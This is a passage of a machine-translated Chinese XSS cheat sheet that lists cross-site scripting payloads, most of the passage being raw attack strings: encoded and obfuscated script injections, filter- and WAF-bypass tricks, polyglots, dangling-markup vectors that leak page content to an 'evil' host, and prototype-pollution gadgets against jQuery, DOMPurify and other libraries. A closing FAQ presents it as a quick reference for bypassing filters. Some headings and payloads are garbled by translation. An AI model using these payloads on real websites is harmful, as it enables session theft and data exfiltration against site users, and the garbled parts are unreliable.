```

#### **带 unicode 转义和 HTML 编码的 SVG 脚本**

```
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
```

#### **采用 base64 编码的 Img 标签**

```
<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
```

**背景属性**

```
<body background="//evil? <table background="//evil? <table><thead background="//evil? <table><tbody background="//evil? <table><tfoot background="//evil? <table><td background="//evil? <table><th background="//evil?
```

### **无脚本攻击**

#### **链接 href 样式表**

```
<link rel=stylesheet href="//evil?
```

#### **链接 href 图标**

```
<link rel=icon href="//evil?
```

```
<meta http-equiv="refresh" content="0; http://evil?
```

#### **Img 通过 src 属性传递标记**

```
<img src="//evil? <image src="//evil?
```

#### **使用轨道元素的视频**

```
<video><track default src="//evil?
```

#### **使用源元素和 src 属性的视频**

```
<video><source src="//evil?
```

#### **使用源元素和 src 属性的音频**

```
<audio><source src="//evil?
```

#### **输入 src**

```
<input type=image src="//evil?
```

#### **按钮使用形式动作**

```
<form><button style="width:100%;height:100%" type=submit formaction="//evil?
```

#### **使用格式动作输入**

```
<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?
```

#### **表单使用动作**

```
<button form=x style="width:100%;height:100%;"><form id=x action="//evil?
```

#### **对象数据**

```
<object data="//evil?
```

#### **Iframe src**

```
<iframe src="//evil?
```

#### **嵌入 src**

```
<embed src="//evil?
```

#### **使用 textarea 消费标记并发布到外部站点**

```
<form><button formaction=//evil>XSS</button><textarea name=x>
```

#### **使用表单目标通过 window.name 传递标记数据**

```
<button form=x>XSS</button><form id=x action=//evil target='
```

#### **使用基本目标通过 window.name 传递标记数据**

```
<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="
```

#### **使用 formtarget 通过 window.name 传递标记数据**

```
<form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="
```

#### **使用基本 href 传递数据**

```
<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/
```

#### **使用嵌入窗口名从页面传递数据**

```
<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
```

#### **使用 iframe 窗口名从页面传递数据**

```
<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
```

#### **使用对象窗口名从页面传递数据**

```
<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
```

#### **使用框架窗口名称从页面传递数据**

```
<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
```

#### **用隐藏输入中的图像覆盖类型属性**

```
<input type=hidden type=image src="//evil?
```

### **多语言者**

#### **多语言有效载荷 1**

```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

#### **多语言有效载荷 2**

```
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

#### **多语言有效载荷 3**

```
javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>
```

### **晶圆绕过全局对象**

#### **XSS 成 JavaScript 字符串:字符串串联(窗口)**

```
';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//
```

#### **XSS 成 JavaScript 字符串:字符串串联(self)**

```
';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//
```

#### **XSS 成 JavaScript 字符串:字符串串联(this)**

```
';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//
```

#### **XSS 成 JavaScript 字符串:字符串串联(上)**

```
';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//
```

#### **XSS 成 JavaScript 字符串:字符串串联(父级)**

```
';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//
```

#### **XSS 成 JavaScript 字符串:字符串串联(帧)**

```
';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//
```

#### **XSS 成 JavaScript 字符串:字符串串联(globalThis)**

```
';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//
```

```
';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//
```

```
';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//
```

```
';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//
```

```
';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//
```

```
';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//
```

```
';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//
```

```
';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//
```

#### **XSS 转换成 JavaScript 字符串:十六进制转义序列(窗口)**

```
';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
```

#### **XSS 转换成 JavaScript 字符串:十六进制转义序列(self)**

```
';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
```

#### **XSS 转换成 JavaScript 字符串:十六进制转义序列(this)**

```
';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
```

#### **XSS 转换成 JavaScript 字符串:十六进制转义序列(上)**

```
';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
```

#### **XSS 转换成 JavaScript 字符串:十六进制转义序列(父序列)**

```
';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
```

#### **XSS 转换成 JavaScript 字符串:十六进制转义序列(帧)**

```
';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
```

#### **XSS 转换成 JavaScript 字符串:十六进制转义序列(globalThis)**

```
';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
```

#### **XSS 成 JavaScript 字符串:十六进制转义序列和 base64 编码字符串(window)**

```
';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');//
```

#### **XSS 成 JavaScript 字符串:十六进制转义序列和 base64 编码字符串(self)**

```
';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');//
```

#### **XSS 成 JavaScript 字符串:十六进制转义序列和 base64 编码字符串(this)**

```
';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');//
```

#### **XSS 成 JavaScript 字符串:十六进制转义序列和 base64 编码字符串(上)**

```
';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');//
```

#### **XSS 成 JavaScript 字符串:十六进制转义序列和 base64 编码字符串(父级)**

```
';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');//
```

#### **XSS 成 JavaScript 字符串:十六进制转义序列和 base64 编码字符串(帧)**

```
';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');//
```

#### **XSS 成 JavaScript 字符串:十六进制转义序列和 base64 编码字符串(globalThis)**

```
';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');//
```

#### **XSS 转换成 JavaScript 字符串:八进制转义序列(窗口)**

```
';window['\141\154\145\162\164']('\130\123\123');//
```

#### **XSS 转换成 JavaScript 字符串:八进制转义序列(self)**

```
';self['\141\154\145\162\164']('\130\123\123');//
```

#### **XSS 转换成 JavaScript 字符串:八进制转义序列(this)**

```
';this['\141\154\145\162\164']('\130\123\123');//
```

#### **XSS 转换成 JavaScript 字符串:八进制转义序列(上)**

```
';top['\141\154\145\162\164']('\130\123\123');//
```

#### **XSS 转换成 JavaScript 字符串:八进制转义序列(父序列)**

```
';parent['\141\154\145\162\164']('\130\123\123');//
```

#### **XSS 转换成 JavaScript 字符串:八进制转义序列(帧)**

```
';frames['\141\154\145\162\164']('\130\123\123');//
```

#### **XSS 转换成 JavaScript 字符串:八进制转义序列(globalThis)**

```
';globalThis['\141\154\145\162\164']('\130\123\123');//
```

#### **XSS 转换成 JavaScript 字符串:unicode escape (window)**

```
';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
```

#### **XSS 转换成 JavaScript 字符串:unicode escape (self)**

```
';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
```

#### **XSS 转换成 JavaScript 字符串:unicode 转义(this)**

```
';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
```

#### **XSS 转换成 JavaScript 字符串:unicode 转义(上)**

```
';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
```

#### **XSS 转换成 JavaScript 字符串:unicode escape (parent)**

```
';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
```

#### **XSS 转换成 JavaScript 字符串:unicode 转义(帧)**

```
';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
```

#### **XSS 转换成 JavaScript 字符串:unicode escape (globalThis)**

```
';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
```

#### **XSS 转换成 JavaScript 字符串:RegExp source 属性(窗口)**

```
';window[/al/.source+/ert/.source](/XSS/.source);//
```

#### **XSS 转换成 JavaScript 字符串:RegExp source property (self)**

```
';self[/al/.source+/ert/.source](/XSS/.source);//
```

#### **XSS 转换成 JavaScript 字符串:RegExp source property (this)**

```
';this[/al/.source+/ert/.source](/XSS/.source);//
```

#### **XSS 转换成 JavaScript 字符串:RegExp source property (top)**

```
';top[/al/.source+/ert/.source](/XSS/.source);//
```

#### **XSS 成 JavaScript 字符串:RegExp source property(parent)**

```
';parent[/al/.source+/ert/.source](/XSS/.source);//
```

#### **XSS 转换成 JavaScript 字符串:RegExp source property(frames)**

```
';frames[/al/.source+/ert/.source](/XSS/.source);//
```

#### **XSS 转换成 JavaScript 字符串:RegExp source property(global this)**

```
';globalThis[/al/.source+/ert/.source](/XSS/.source);//
```

#### **XSS 转换成 JavaScript 字符串:Hieroglyphy/JSFuck (window)**

```
';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
```

#### **XSS 转换成 JavaScript 字符串:Hieroglyphy/JSFuck (self)**

```
';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
```

#### **XSS 转换成 JavaScript 字符串:Hieroglyphy/JSFuck (this)**

```
';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
```

#### **XSS 转换成 JavaScript 字符串:Hieroglyphy/JSFuck (top)**

```
';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
```

#### **XSS 转换成 JavaScript 字符串:Hieroglyphy/JSFuck (parent)**

```
';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
```

#### **XSS 转换成 JavaScript 字符串:Hieroglyphy/JSFuck (frames)**

```
';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
```

#### **XSS 转换成 JavaScript 字符串:Hieroglyphy/js fuck(global this)**

```
';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
```

## **内容类型**

我们的 XSS 备忘单的这一部分列出了可用于 XSS 的内容类型，其中 X-Content-Type-Options: nosniff 标题及其 POC 处于活动状态。

#### **文本/html**

```
<script>alert(document.domain)</script>
```

#### **应用/xhtml+xml**

```
<x : script xmlns : x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
```

#### **应用程序/xml**

```
<x : script xmlns : x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
```

#### **文本/xml**

```
<x : script xmlns : x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
```

#### **image/svg+xml**

```
<x : script xmlns : x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
```

#### **文字/xsl**

```
<x : script xmlns : x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
```

#### **application/vnd . WAP . XHTML+XML**

```
<x : script xmlns : x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
```

#### **text/rdf**

```
<x : script xmlns : x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
```

#### **应用程序/rdf+xml**

```
<x : script xmlns : x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
```

#### **应用程序/mathml+xml**

```
<x : script xmlns : x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
```

#### **text/vtt**

```
<script>alert(document.domain)</script>
```

#### **文本/缓存清单**

```
<script>alert(document.domain)</script>
```

### **原型污染**

下一节将介绍不同的原型污染攻击，以及它们的 XSS 有效载荷。

#### **Wistia 嵌入式视频**

```
<script>

Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';

</script>
```

#### **$(x)。关闭 jQuery**

```
<script>

Object.prototype.preventDefault='x';

Object.prototype.handleObj='x';

Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';

/* No extra code needed for jQuery 1 & 2 */$(document).off('foobar');

</script>
```

#### **$(html) jQuery**

```
<script>

Object.prototype.div=['1','<img src onerror=alert(1)>','1']

</script><script>

$('<div x="x"></div>')

</script>
```

#### **$。获取 jQuery**

```
<script>

Object.prototype.url = ['data:,alert(1)//'];

Object.prototype.dataType = 'script';

</script>

<script>

$.get('https://google.com/');

$.post('https://google.com/');

</script>
```

#### **美元。getScript jQuery**

```
<script>

Object.prototype.src = ['data:,alert(1)//']

</script>

<script>

$.getScript('https://google.com/')

</script>
```

#### **美元。getScript jQuery**

```
<script>

Object.prototype.url = 'data:,alert(1)//'

</script>

<script>

$.getScript('https://google.com/')

</script>
```

#### **谷歌 reCAPTCHA**

```
<script>

Object.prototype.srcdoc=['<script>alert(1)<\/script>']

</script>

<div class="g-recaptcha" data-sitekey="your-site-key"/>
```

```
<script>

Object.prototype.hif = ['javascript:alert(document.domain)'];

</script>
```

#### **Tealium 通用标签**

```
<script>

Object.prototype.attrs = {src:1};

Object.prototype.src='https://portswigger-labs.net/xss/xss.js'

</script>
```

#### **阿卡迈飞镖**

```
<script>Object.prototype.BOOMR = 1;

Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script>
```

#### **洛达什**

```
<script>

Object.prototype.sourceURL = '\u2028\u2029alert(1)'

</script>

<script>

_.template('test')

</script>
```

#### **sanitize-html**

```
<script>

Object.prototype['*'] = ['onload']</script>

<script>

document.write(sanitizeHtml('<iframe onload=alert(1)>'))

</script>
```

#### **js-xss**

```
<script>

Object.prototype.whiteList = {img: ['onerror', 'src']}

</script>

<script>

document.write(filterXSS('<img src onerror=alert(1)>'))

</script>
```

#### 驯化

```
<script>

Object.prototype.ALLOWED_ATTR = ['onerror', 'src']

</script>

<script>

document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))

</script>
```

#### 驯化

```
<script>

Object.prototype.documentMode = 9

</script>
```

#### **关闭**

```
<script>

const html = '<img src onerror=alert(1)>';

const sanitizer = new goog.html.sanitizer.HtmlSanitizer();

const sanitized = sanitizer.sanitize(html);

const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);

</script>
```

#### **关闭**

```
<script>

Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';

</script>
```

#### **牵线木偶. js / Backbone.js**

```
<script>

Object.prototype.tagName = 'img'

Object.prototype.src = ['x:x']

Object.prototype.onerror = ['alert(1)']

</script>

<script>

(function() {

var View = Mn.View.extend({template: '#template-layout'});

var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});

var app = new App();

app.start();

})();

</script>

<div id="template-layout" type="x-template/underscore">xxx</div>
```

#### **Adobe 动态标签管理**

```
<script>

Object.prototype.src='data:,alert(1)//'

</script>
```

#### **嵌入式卡**

```
<script>

Object.prototype.onload = 'alert(1)'

</script>
```

细分分析. js

```
<script>

Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']

</script>
```

#### **Knockout.js**

```
<strong data-bind="text:'hello'"></strong>

<script>

Object.prototype[4]="a':1,[alert(1)]:1,'b";Object.prototype[5]=',';

</script><script>

ko.applyBindings({})

</script>
```

## **结论**

在这个 XSS 备忘单中，我们讨论了与 XSS(跨站点脚本)相关的各种命令，您可以在需要时立即查阅。XSS 允许恶意脚本进入网站，以执行一些操作。每当您需要 XSS 命令时，这个跨站点脚本备忘单可以作为您的快速参考。

有兴趣了解更多关于注射和网络攻击的知识吗？[查看我们的 SQL 注入备忘单](https://hackr.io/blog/sql-injection-cheat-sheet)。

## **常见问题解答**

#### **1。什么是 XSS 小抄？**

XSS 备忘单由各种 XSS 向量组成，帮助你绕过 WAFs 和过滤器。

#### **2。什么是 XSS 攻击(举例)？**

XSS 或跨站脚本攻击是指黑客在受害者的浏览器中运行恶意的 JavaScript 代码。XSS 攻击的一个典型例子是黑客在网站搜索表单发送的数据中存储恶意脚本。

#### **3。XSS 的三种类型是什么？**

三种类型的 XSS 攻击是:

*   反映了 XSS
*   商店 XSS
*   基于 DOM 的 XSS

#### **4。我能在哪里练习 XSS？**

有太多易受攻击的网站可供你练习 XSS。这些易受攻击的网站如下:

*   谷歌 XSS 游戏
*   警惕(1)赢
*   提示(1)获胜
*   山形 21 的 XSS 挑战
*   kopernik 的 xss 挑战
*   XSS 多语言挑战
*   Acunetix 的 Vulnweb
*   OWASP WebGoat 项目

#### **5。HTML 编码能防止 XSS 吗？**

不，HTML 编码不能阻止 XSS 或覆盖所有类型的 XSS 攻击。

#### **6。哪种类型的 XSS 攻击最常见？**

最常见的 XSS 攻击类型是反射攻击或非持续性攻击。